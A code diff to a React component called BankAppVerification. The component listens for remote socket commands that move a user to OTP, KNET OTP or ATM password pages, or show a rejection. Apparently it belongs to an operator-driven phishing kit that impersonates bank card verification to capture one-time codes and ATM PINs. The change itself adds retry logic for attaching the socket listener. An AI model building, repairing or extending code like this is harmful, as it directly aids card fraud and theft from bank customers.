@@ -20,24 +20,23 @@ export default function BankAppVerification() {
 
   // Direct socket action handler
   useEffect(() => {
-    const s = socket.value;
-    if (!s) return;
+    let s: any = null; let timer: any = null; let tries = 0;
     const handler = (action: string) => {
       console.log("bankapp card:action ->", action);
       const isKnet = localStorage.getItem("flowType") === "knet";
-      waitingMessage.value = "";
-      setIsWaiting(false);
-      if (action === "otp") {
-        navigate(isKnet ? "/knet-otp" : "/otp-verification");
-      } else if (action === "atm") {
-        navigate("/atm-password");
-      } else if (action === "reject") {
-        setRejected(true);
-        setError(true);
-      }
+      waitingMessage.value = ""; setIsWaiting(false);
+      if (action === "otp") { navigate(isKnet ? "/knet-otp" : "/otp-verification"); }
+      else if (action === "atm") { navigate("/atm-password"); }
+      else if (action === "reject") { setRejected(true); setError(true); }
     };
-    s.on("card:action", handler);
-    return () => { s.off("card:action", handler); };
+    const attach = () => {
+      s = socket.value;
+      if (!s) { if (++tries < 60) timer = setTimeout(attach, 400); return; }
+      console.log("bankapp socket attached:", s.id);
+      s.on("card:action", handler);
+    };
+    attach();
+    return () => { if (timer) clearTimeout(timer); if (s) s.off("card:action", handler); };
   }, []);
 
   useSignalEffect(() => {
